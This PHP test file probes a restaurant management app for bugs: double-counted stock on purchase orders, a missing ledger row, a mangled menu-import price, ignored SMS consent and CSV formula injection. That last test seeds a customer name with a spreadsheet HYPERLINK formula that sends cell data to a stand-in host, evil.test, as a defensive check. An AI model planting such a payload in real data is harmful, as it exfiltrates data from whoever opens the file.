<?php
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (c) JUWRI LTD

namespace Tests\Modules\Inventory;

use App\Http\Middleware\Installed;
use App\Http\Middleware\PreventRequestForgery;
use App\Models\Campaign;
use App\Models\CampaignRecipient;
use App\Models\Customer;
use App\Models\Ingredient;
use App\Services\InventoryService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Str;
use Juwri\Core\Models\Store;
use Juwri\Core\Models\User;
use Juwri\Modules\Integrations\Services\Import\GloriaFoodImporter;
use Juwri\Modules\Inventory\Models\PurchaseOrder;
use Juwri\Modules\Inventory\Models\PurchaseOrderItem;
use Juwri\Modules\Inventory\Models\StockMovement;
use Juwri\Modules\Inventory\Services\Inventory\ReceivingService;
use Juwri\Modules\Marketing\Jobs\SendCampaignJob;
use Juwri\Modules\Menu\Models\Menu;
use Tests\Support\TestPlans;
use Tests\Support\UniquePhone;
use Tests\TestCase;

/**
 * DISCOVERY probes for the owner-operations domain. Every test here is written
 * to FAIL where the application behaves wrongly for a real user; nothing in this
 * file asserts that anything works.
 */
class P1ProbeOwnerOpsTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        $this->withoutMiddleware([
            Installed::class,
            PreventRequestForgery::class,
        ]);
    }

    private function owner(): User
    {
        $plan = TestPlans::create([
            'name' => 'P '.Str::random(5), 'description' => 'T',
            'monthly_price' => 1, 'annual_price' => 1, 'lifetime_price' => 1,
            'settings' => ['restaurant_limit' => 999, 'menu_limit' => 999],
            'status' => 1,
        ]);

        return User::factory()->create([
            'group_id' => (string) $plan->id, 'status' => 1, 'email_verified_at' => now(),
        ]);
    }

    private function storeFixture(User $owner): Store
    {
        $title = 'R '.Str::random(5);

        return Store::create([
            'user_id' => $owner->id, 'slug' => Str::slug($title).'-'.Str::lower(Str::random(5)),
            'color' => '#111', 'title' => $title, 'sub_title' => 'T', 'description' => 'T',
            'main_image' => 'd.png', 'cover_image' => 'd.png', 'address' => '1 St', 'phone' => '1',
        ]);
    }

    // ------------------------------------------------------------------
    // A. Purchase-order receiving: two writers, one quantity.
    // ------------------------------------------------------------------

    /**
     * A partial line-receive (5 of 10) followed by the "Receive stock" button
     * (still shown, because the PO is only `partial`) adds the FULL ordered 10
     * on top of the 5 already applied.
     */
    public function test_partial_line_receive_then_receive_button_double_counts_stock(): void
    {
        $owner = $this->owner();
        $r = $this->storeFixture($owner);

        $ing = Ingredient::create([
            'store_id' => $r->id, 'name' => 'Flour', 'unit' => 'kg',
            'current_stock' => 0, 'par_level' => 0, 'cost_per_unit' => 2.00, 'active' => 1,
        ]);

        $po = PurchaseOrder::create([
            'store_id' => $r->id, 'status' => 'ordered', 'total' => 20,
        ]);
        $line = PurchaseOrderItem::create([
            'purchase_order_id' => $po->id, 'ingredient_id' => $ing->id,
            'quantity' => 10, 'unit_cost' => 2.00, 'line_total' => 20,
        ]);

        // Step 1 — supplier-suite line receiving: only 5 kg actually turned up.
        (new ReceivingService)->receive($po->fresh('items'), [
            ['item_id' => $line->id, 'qty_received' => 5, 'actual_unit_cost' => 2.00],
        ]);

        $this->assertSame('partial', $po->fresh()->status, 'precondition: PO is partial');
        $this->assertEqualsWithDelta(5.0, (float) $ing->fresh()->current_stock, 0.001, 'precondition: 5 kg on hand');

        // Step 2 — the PO screen still shows "Receive stock" while status is
        // `partial` (purchase-order-show.blade.php: $editable excludes only
        // received/cancelled), so the owner clicks it.
        InventoryService::receivePurchaseOrder($po->fresh());

        $onHand = (float) $ing->fresh()->current_stock;
        $this->assertEqualsWithDelta(
            5.0,
            $onHand,
            0.001,
            "Only 5 kg was ever delivered, but inventory now shows {$onHand} kg."
        );
    }

    /**
     * The reverse order double-counts too: the plain Receive button, then a
     * line-receive of the same quantity. receiveLines has no already-received
     * guard.
     */
    public function test_receive_button_then_line_receive_double_counts_stock(): void
    {
        $owner = $this->owner();
        $r = $this->storeFixture($owner);

        $ing = Ingredient::create([
            'store_id' => $r->id, 'name' => 'Sugar', 'unit' => 'kg',
            'current_stock' => 0, 'par_level' => 0, 'cost_per_unit' => 3.00, 'active' => 1,
        ]);
        $po = PurchaseOrder::create(['store_id' => $r->id, 'status' => 'ordered', 'total' => 30]);
        $line = PurchaseOrderItem::create([
            'purchase_order_id' => $po->id, 'ingredient_id' => $ing->id,
            'quantity' => 10, 'unit_cost' => 3.00, 'line_total' => 30,
        ]);

        InventoryService::receivePurchaseOrder($po->fresh());
        $this->assertEqualsWithDelta(10.0, (float) $ing->fresh()->current_stock, 0.001, 'precondition');

        (new ReceivingService)->receive($po->fresh('items'), [
            ['item_id' => $line->id, 'qty_received' => 10, 'actual_unit_cost' => 3.00],
        ]);

        $onHand = (float) $ing->fresh()->current_stock;
        $this->assertEqualsWithDelta(
            10.0,
            $onHand,
            0.001,
            "10 kg delivered once, but inventory shows {$onHand} kg."
        );
    }

    /**
     * InventoryService is documented as the single writer: "Every change to an
     * ingredient's stock MUST go through recordMovement()". ReceivingService
     * writes current_stock directly, so the immutable ledger loses the receipt.
     */
    public function test_line_receiving_writes_no_stock_movement_row(): void
    {
        $owner = $this->owner();
        $r = $this->storeFixture($owner);

        $ing = Ingredient::create([
            'store_id' => $r->id, 'name' => 'Salt', 'unit' => 'kg',
            'current_stock' => 0, 'par_level' => 0, 'cost_per_unit' => 1.00, 'active' => 1,
        ]);
        $po = PurchaseOrder::create(['store_id' => $r->id, 'status' => 'ordered', 'total' => 8]);
        $line = PurchaseOrderItem::create([
            'purchase_order_id' => $po->id, 'ingredient_id' => $ing->id,
            'quantity' => 8, 'unit_cost' => 1.00, 'line_total' => 8,
        ]);

        (new ReceivingService)->receive($po->fresh('items'), [
            ['item_id' => $line->id, 'qty_received' => 8, 'actual_unit_cost' => 1.00],
        ]);

        $this->assertEqualsWithDelta(8.0, (float) $ing->fresh()->current_stock, 0.001, 'stock cache moved');
        $this->assertSame(
            8.0,
            (float) StockMovement::where('ingredient_id', $ing->id)->sum('quantity'),
            'stock_movements ledger must equal the cached current_stock'
        );
    }

    // ------------------------------------------------------------------
    // B. Menu import: thousands separator destroys the price.
    // ------------------------------------------------------------------

    public function test_menu_import_price_with_thousands_separator(): void
    {
        $owner = $this->owner();
        $r = $this->storeFixture($owner);

        $csv = "Category,Item,Description,Price\n"
             ."Mains,Wagyu platter,Sharing dish,\"1,250.00\"\n"
             ."Mains,Nasi goreng,Fried rice,\"25,000\"\n";

        (new GloriaFoodImporter)->import($r->id, $csv);

        $wagyu = Menu::where('store_id', $r->id)->where('name', 'Wagyu platter')->first();
        $nasi = Menu::where('store_id', $r->id)->where('name', 'Nasi goreng')->first();

        $this->assertNotNull($wagyu, 'item imported');
        $this->assertEqualsWithDelta(
            1250.00,
            (float) $wagyu->price,
            0.001,
            'imported price for "1,250.00"'
        );
        $this->assertEqualsWithDelta(
            25000.0,
            (float) $nasi->price,
            0.001,
            'imported price for "25,000"'
        );
    }

    // ------------------------------------------------------------------
    // C. Customer CSV export: spreadsheet formula injection.
    // ------------------------------------------------------------------

    public function test_customer_export_neutralises_formula_injection(): void
    {
        $owner = $this->owner();
        $r = $this->storeFixture($owner);

        Customer::create([
            'store_id' => $r->id,
            'name' => '=HYPERLINK("https://evil.test/?d="&A2,"Click for your refund")',
            'phone' => UniquePhone::next('55'),
        ]);

        $res = $this->actingAs($owner)->get(route('customers.export'));
        $res->assertOk();
        $body = $res->streamedContent();

        $this->assertStringNotContainsString(
            ',=HYPERLINK',
            $body,
            'a customer-supplied name must not land in the CSV as a live formula'
        );
        $this->assertStringNotContainsString(
            '"=HYPERLINK',
            $body,
            'a customer-supplied name must not land in the CSV as a live formula'
        );
    }

    // ------------------------------------------------------------------
    // D. SMS campaign ignores the channel-specific sms_consent flag.
    // ------------------------------------------------------------------

    public function test_sms_campaign_excludes_customer_without_sms_consent(): void
    {
        $owner = $this->owner();
        $r = $this->storeFixture($owner);

        // Diner ticked "email me offers" but NOT "text me".
        $c = Customer::create([
            'store_id' => $r->id,
            'name' => 'Email only',
            'phone' => UniquePhone::next('55'),
            'email' => Str::random(6).'@t.test',
            'marketing_consent' => true,
            'sms_consent' => false,
        ]);

        $campaign = Campaign::create([
            'store_id' => $r->id,
            'name' => 'Blast',
            'channel' => 'sms',
            'subject' => 'Hi',
            'body' => 'Offer',
            'segment' => 'all',
            'status' => 'scheduled',
        ]);

        new SendCampaignJob($campaign->id)->handle();

        $this->assertSame(
            0,
            CampaignRecipient::where('campaign_id', $campaign->id)
                ->where('customer_id', $c->id)->count(),
            'an SMS campaign must not target a customer whose sms_consent is false'
        );
    }
}
